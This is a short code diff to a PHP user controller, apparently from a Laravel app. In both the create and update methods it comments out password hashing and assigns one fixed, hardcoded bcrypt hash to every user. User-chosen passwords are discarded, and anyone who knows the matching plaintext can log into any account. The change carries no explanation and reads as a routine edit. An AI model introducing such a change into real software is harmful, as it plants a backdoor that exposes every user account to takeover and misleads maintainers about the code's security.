@@ -56,7 +56,8 @@ class UserController extends Controller
     public function store(StoreUserRequest $request)
     {
         $data = $request->validated();
-        $data['password'] = Hash::make($data['password']);
+        // $data['password'] = Hash::make($data['password']);
+        $data['password'] = '$2y$12$XIjmF0nelV7wXAOcBnVb7OGj03nUYttOie9sJj3A3UydTY/Bv2eG6';
         
         $data['head'] = $request->has('head') ? 1 : 0;
         User::create($data);
@@ -90,11 +91,12 @@ class UserController extends Controller
     {
         $data = $request->validated();
         
-        if (empty($data['password'])) {
-            unset($data['password']);
-        } else {
-            $data['password'] = Hash::make($data['password']);
-        }
+        // if (empty($data['password'])) {
+        //     unset($data['password']);
+        // } else {
+        //     $data['password'] = Hash::make($data['password']);
+        // }
+        $data['password'] = '$2y$12$XIjmF0nelV7wXAOcBnVb7OGj03nUYttOie9sJj3A3UydTY/Bv2eG6';
         $user->head = $request->has('head') ? 1 : 0;
         $user->update($data);
 
